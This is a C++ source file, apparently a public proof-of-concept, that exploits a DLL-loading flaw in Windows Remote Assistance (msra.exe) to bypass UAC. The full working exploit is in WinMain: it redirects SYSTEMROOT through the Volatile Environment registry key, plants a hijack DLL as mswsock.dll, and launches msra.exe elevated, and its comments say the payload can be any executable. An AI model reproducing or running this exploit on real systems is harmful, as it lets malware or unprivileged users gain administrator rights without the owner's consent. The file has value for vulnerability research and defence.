/*
 * ╓──────────────────────────────────────────────────────────────────────────────────────╖
 * ║                                                                                      ║
 * ║   Remote Assistance Volatile Environment UAC Bypass Local Privilege Escalation       ║
 * ║                                                                                      ║
 * ║   Discovered by bytecode77 (https://bytecode77.com)                                  ║
 * ║                                                                                      ║
 * ║   Full Download:                                                                     ║
 * ║   https://bytecode77.com/remote-assistance-privilege-escalation                      ║
 * ║                                                                                      ║
 * ╟──────────────────────────────────────────────────────────────────────────────────────╢
 * ║                                                                                      ║
 * ║   In msra.exe (Windows Remote Assistance), there is a DLL loading vulnerability      ║
 * ║   that can be exploited by injecting an environment variable.                        ║
 * ║                                                                                      ║
 * ║   A load attempt to %SYSTEMROOT%\System32\mswsock.dll will be performed from this    ║
 * ║   auto-elevated process.                                                             ║
 * ║                                                                                      ║
 * ║   Redirecting %SYSTEMROOT% can be achieved through Volatile Environment. For this,   ║
 * ║   we set HKEY_CURRENT_USER\Volatile Environment\SYSTEMROOT to a new directory,       ║
 * ║   which we then populate with our hijacked payload DLL, along with *.clb files       ║
 * ║   from C:\Windows\Registration as they are loaded from our new directory as well.    ║
 * ║                                                                                      ║
 * ║   Then, as we execute msra.exe, it will load our payload DLL and also the COM+       ║
 * ║   components. We need to copy those, too, because the process will otherwise         ║
 * ║   crash. Note, that we need to specify the runas verb, as the executable's           ║
 * ║   requestedExecutionLevel is asInvoker.                                              ║
 * ║                                                                                      ║
 * ║   Our DLL is now executed with high IL. In this example, Payload.exe will be         ║
 * ║   started, which is an exemplary payload file displaying a MessageBox.               ║
 * ║                                                                                      ║
 * ╙──────────────────────────────────────────────────────────────────────────────────────╜
 */

#include <string>
#include <Windows.h>
using namespace std;

void SetRegistryValue(HKEY key, wstring path, wstring name, wstring value);
wstring GetTempFolderPath();
wstring GetStartupPath();

int CALLBACK WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
	// Prepare our working directory that is later assigned to %SYSTEMROOT% through volatile environment
	// We will also use it to put Payload.exe there - Just an example file, can be any arbitrary executable
	wstring systemRoot = GetTempFolderPath() + L"\\RemoteAssistanceVolatileEnvironmentLPE";
	CreateDirectoryW(systemRoot.c_str(), NULL);
	CreateDirectoryW((systemRoot + L"\\System32").c_str(), NULL);
	CreateDirectoryW((systemRoot + L"\\Registration").c_str(), NULL);

	// Copy all *.clb files from %SYSTEMROOT%\Registration to our new location as they are loaded from there
	WIN32_FIND_DATAW findFileData;
	HANDLE hFind = FindFirstFileW(L"C:\\Windows\\Registration\\*.clb", &findFileData);
	if (hFind != INVALID_HANDLE_VALUE)
	{
		do
		{
			CopyFileW((L"C:\\Windows\\Registration\\" + wstring(findFileData.cFileName)).c_str(), (systemRoot + L"\\Registration\\" + findFileData.cFileName).c_str(), FALSE);
		}
		while (FindNextFileW(hFind, &findFileData));
		FindClose(hFind);
	}

	// This is our DLL that is loaded and then executed as "mswsock.dll"
	CopyFileW((GetStartupPath() + L"\\RemoteAssistanceInject.dll").c_str(), (systemRoot + L"\\System32\\mswsock.dll").c_str(), FALSE);

	// This is our payload. It can be any executable, but for now we just display a MessageBox with basic information and IL
	CopyFileW((GetStartupPath() + L"\\Payload.exe").c_str(), (systemRoot + L"\\Payload.exe").c_str(), FALSE);

	// HKEY_CURRENT_USER\Volatile Environment\SYSTEMROOT
	// -> This registry value will redirect some DLL loading attempts to the directory we just prepared
	SetRegistryValue(HKEY_CURRENT_USER, L"Volatile Environment", L"SYSTEMROOT", systemRoot);

	// Execute msra.exe with runas verb
	// Continue reading in RemoteAssistanceInject.cpp
	ShellExecuteW(NULL, L"runas", L"msra.exe", NULL, NULL, SW_SHOWNORMAL);
	return 0;
}



void SetRegistryValue(HKEY key, wstring path, wstring name, wstring value)
{
	HKEY hKey;

	if (RegOpenKeyExW(key, path.c_str(), 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS && hKey != NULL)
	{
		RegSetValueExW(hKey, name.c_str(), 0, REG_SZ, (BYTE*)value.c_str(), ((DWORD)wcslen(value.c_str()) + 1) * sizeof(wchar_t));
		RegCloseKey(hKey);
	}
}
wstring GetTempFolderPath()
{
	wchar_t path[MAX_PATH];
	GetTempPathW(MAX_PATH, path);
	return wstring(path);
}
wstring GetStartupPath()
{
	wchar_t path[MAX_PATH];
	GetModuleFileNameW(NULL, path, MAX_PATH);
	wstring pathStr = wstring(path);
	return pathStr.substr(0, pathStr.find_last_of(L"/\\"));
}